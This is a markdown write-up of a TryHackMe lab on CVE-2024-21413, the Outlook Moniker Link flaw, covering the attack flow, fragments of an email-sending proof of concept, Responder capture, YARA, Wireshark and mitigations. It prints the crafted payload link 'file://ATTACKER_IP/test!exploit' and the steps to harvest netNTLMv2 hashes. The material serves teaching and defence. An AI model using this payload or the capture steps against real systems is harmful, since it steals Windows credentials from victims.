@@ -1,0 +1,396 @@
+# CVE-2024-21413 — Microsoft Outlook Moniker Link
+
+## 1. Vulnerability Overview
+
+**CVE-2024-21413**, also known as the **Microsoft Outlook Moniker Link vulnerability**, is a critical vulnerability affecting Microsoft Outlook.
+
+The vulnerability can allow an attacker to bypass certain **Protected View** protections by using a specially crafted Moniker Link.
+
+The vulnerability can be associated with:
+
+* Credential leakage
+* Potential Remote Code Execution (RCE)
+
+**Severity:** Critical
+**CVSS Score:** 9.8
+**Published:** 13 February 2024
+
+---
+
+## 2. Outlook and HTML Emails
+
+Microsoft Outlook can render email messages containing HTML content.
+
+For example:
+
+```html
+<p><a href="https://example.com">Click me</a></p>
+```
+
+Common web links such as HTTP and HTTPS are normally handled by Outlook and Windows.
+
+Windows also supports special URL mechanisms known as **Moniker Links**, which can reference resources using protocols such as `file://`.
+
+---
+
+## 3. `file://` Moniker Links
+
+A `file://` URI can reference a file or network resource.
+
+Example:
+
+```html
+<p><a href="file://ATTACKER_IP/test">Click me</a></p>
+```
+
+When a remote resource is referenced, Windows may attempt to access it over a network protocol such as **SMB**.
+
+**SMB (Server Message Block)** is widely used by Windows systems for network file sharing and related network operations.
+
+In the context of CVE-2024-21413, a specially crafted Moniker Link can cause Outlook to interact with a remote resource in a way that can result in an authentication attempt.
+
+---
+
+## 4. Protected View
+
+**Protected View** is a security feature in Microsoft Office applications designed to restrict potentially dangerous content and reduce the risk associated with untrusted documents or content.
+
+The vulnerability involves bypassing protections associated with this security mechanism.
+
+Conceptually:
+
+```text
+Malicious Link
+      |
+      v
+Outlook Security Checks
+      |
+      v
+Protected View Protection
+      |
+      v
+Vulnerability Allows Bypass
+      |
+      v
+Remote Resource Access
+```
+
+The important point is that the vulnerability does not simply represent a normal `file://` link. It involves a specially crafted Moniker Link that abuses Outlook/Windows handling of the URI.
+
+---
+
+## 5. The `!` Character
+
+A key characteristic of the vulnerable Moniker Link is the use of the `!` character followed by additional content.
+
+Example:
+
+```html
+<p><a href="file://ATTACKER_IP/test!exploit">Click me</a></p>
+```
+
+The `!` is an important part of the specially crafted URI used in the vulnerability.
+
+The exact behavior depends on how Outlook and Windows process the crafted Moniker Link.
+
+---
+
+# 6. Attack Flow
+
+A simplified attack flow is:
+
+```text
+Attacker
+   |
+   | Malicious HTML email
+   v
+Victim's Outlook
+   |
+   | Victim clicks the link
+   v
+Crafted Moniker Link
+   |
+   v
+Protected View Bypass
+   |
+   v
+Remote SMB Connection
+   |
+   v
+NTLM Authentication Attempt
+   |
+   v
+Authentication Response
+   |
+   v
+Attacker Captures Authentication Data
+```
+
+The attacker does not need to directly obtain the victim's plaintext password.
+
+Instead, the interaction can cause the victim's system to initiate an authentication exchange with a remote system controlled by the attacker.
+
+---
+
+## 7. Proof of Concept (PoC)
+
+The TryHackMe lab provides a Python-based Proof of Concept that creates and sends an HTML email containing the crafted Moniker Link.
+
+### Required Imports
+
+```python
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.utils import formataddr
+```
+
+These modules are used to construct the email and communicate with the SMTP server.
+
+### Sender and Receiver
+
+Example:
+
+```python
+sender_email = 'attacker@monikerlink.thm'
+receiver_email = 'victim@monikerlink.thm'
+```
+
+The sender represents the attacker-controlled mailbox, while the receiver represents the lab victim.
+
+### Password
+
+The PoC requests the sender's mailbox password:
+
+```python
+password = input("Enter your attacker email password: ")
+```
+
+For the TryHackMe lab, the provided password is:
+
+```text
+attacker
+```
+
+### Malicious HTML
+
+The email contains the crafted Moniker Link:
+
+```html
+<p><a href="file://ATTACKER_IP/test!exploit">Click me</a></p>
+```
+
+For the lab, replace `ATTACKER_IP` with the AttackBox IP.
+
+Example:
+
+```html
+<p><a href="file://10.49.66.188/test!exploit">Click me</a></p>
+```
+
+> **Note:** IP addresses shown in TryHackMe examples are specific to a particular lab instance and may change.
+
+### SMTP Connection
+
+The PoC connects to the SMTP server provided by the lab:
+
+```python
+server = smtplib.SMTP('10.49.151.203', 25)
+```
+
+Port **25** is commonly used for SMTP communication and is the port used by this lab.
+
+---
+
+# 8. Sending the Email
+
+Run the PoC with:
+
+```bash
+python3 exploit.py
+```
+
+When prompted, enter the lab-provided attacker mailbox password:
+
+```text
+attacker
+```
+
+If the email is successfully delivered, the script displays:
+
+```text
+Email delivered
+```
+
+---
+
+# 9. Capturing Authentication with Responder
+
+**Responder** is a network security tool that can listen for authentication attempts from Windows systems.
+
+In the TryHackMe AttackBox environment, the room uses:
+
+```bash
+sudo responder -I ens5
+```
+
+Where:
+
+* `sudo` — runs the command with elevated privileges.
+* `responder` — starts Responder.
+* `-I` — specifies the network interface.
+* `ens5` — the network interface used by the AttackBox in the lab.
+
+Expected output includes:
+
+```text
+[+] Listening for events...
+```
+
+Responder then waits for network interactions that cause Windows authentication attempts.
+
+---
+
+# 10. Capturing NTLM Authentication Data
+
+After the malicious email reaches the vulnerable Outlook system:
+
+1. Open Outlook.
+2. Open the malicious email.
+3. Click **Click me**.
+4. Return to the AttackBox.
+5. Observe the Responder output.
+
+The lab demonstrates that the victim system can initiate an **NTLM-based authentication exchange** with the attacker's listener.
+
+The captured material is commonly referred to as **netNTLMv2 authentication data**.
+
+The victim's plaintext password is **not directly transmitted** during this authentication exchange.
+
+---
+
+# 11. YARA Detection
+
+**YARA** is a pattern-matching tool commonly used to identify suspicious files or content based on defined rules.
+
+A YARA rule can be created to detect characteristics associated with CVE-2024-21413 exploitation.
+
+One important characteristic is the presence of:
+
+```text
+file://
+```
+
+combined with other suspicious characteristics of a crafted Moniker Link.
+
+Conceptually:
+
+```text
+Email
+   |
+   v
+YARA Rule
+   |
+   v
+Pattern Matching
+   |
+   +---- Suspicious Pattern Found
+   |             |
+   |             v
+   |       Potential Malicious Email
+   |
+   +---- No Match
+```
+
+YARA is a **detection mechanism**, not an exploitation tool.
+
+---
+
+# 12. Network Analysis with Wireshark
+
+**Wireshark** can be used to inspect network packets generated during the interaction.
+
+In the lab, network traffic associated with the SMB authentication attempt can be observed using Wireshark.
+
+Simplified flow:
+
+```text
+Victim System
+     |
+     v
+SMB Authentication Request
+     |
+     v
+Network Packets
+     |
+     v
+Wireshark
+     |
+     v
+Packet Analysis
+```
+
+The packet capture can reveal information associated with the NTLM authentication exchange.
+
+This demonstrates how network monitoring tools can help security analysts investigate suspicious authentication activity.
+
+---
+
+# 13. Mitigation
+
+Microsoft released security updates addressing CVE-2024-21413 as part of the **February 2024 security updates**.
+
+Recommended defensive measures include:
+
+* Keep Microsoft Office and Outlook fully updated.
+* Apply security patches provided by Microsoft.
+* Avoid opening or interacting with suspicious links in unsolicited emails.
+* Verify unexpected email links before interacting with them.
+* Report suspicious messages to the appropriate security team.
+* Monitor for unusual outbound SMB connections.
+* Restrict SMB traffic at network boundaries where appropriate.
+
+Completely disabling SMB may not be practical in enterprise environments because organisations can rely on SMB for legitimate network file-sharing operations.
+
+The appropriate mitigation is therefore generally based on **patching, email security, network controls, and monitoring**, rather than relying solely on disabling SMB.
+
+---
+
+# 14. Important Terms
+
+| Term               | Meaning                                                                        |
+| ------------------ | ------------------------------------------------------------------------------ |
+| **CVE**            | Identifier assigned to a publicly known cybersecurity vulnerability            |
+| **Moniker Link**   | A Windows URL mechanism used to reference resources                            |
+| **Protected View** | Microsoft Office security feature that restricts potentially dangerous content |
+| **SMB**            | Windows network protocol commonly used for file and resource sharing           |
+| **NTLM**           | Windows authentication protocol/mechanism                                      |
+| **netNTLMv2**      | Challenge-response authentication data exchanged over the network              |
+| **SMTP**           | Protocol commonly used for sending email                                       |
+| **Responder**      | Tool capable of listening for certain network authentication requests          |
+| **YARA**           | Pattern-matching tool used for malware and threat detection                    |
+| **Wireshark**      | Network protocol and packet analysis tool                                      |
+| **RCE**            | Remote Code Execution                                                          |
+| **PoC**            | Proof of Concept                                                               |
+
+---
+
+# 15. Key Takeaways
+
+* **CVE-2024-21413** is a critical Microsoft Outlook vulnerability involving specially crafted Moniker Links.
+* The vulnerability can be used to bypass certain **Protected View** protections.
+* A crafted `file://` URI can cause interaction with a remote resource.
+* The interaction can result in an **SMB/NTLM authentication attempt**.
+* The attacker may capture **netNTLMv2 authentication data** rather than the victim's plaintext password.
+* **Responder** can be used in an authorized lab to observe the authentication attempt.
+* **YARA** can help detect suspicious Moniker Link characteristics.
+* **Wireshark** can be used to analyze the resulting network traffic.
+* Applying Microsoft's security updates is a primary mitigation.
+
+---
+
+## Disclaimer
+
+This documentation is intended for **educational and defensive cybersecurity learning**.
+
+The Proof of Concept and security tools described here should only be used in **authorized environments**, such as TryHackMe labs, personal test systems, or systems where explicit permission has been granted.
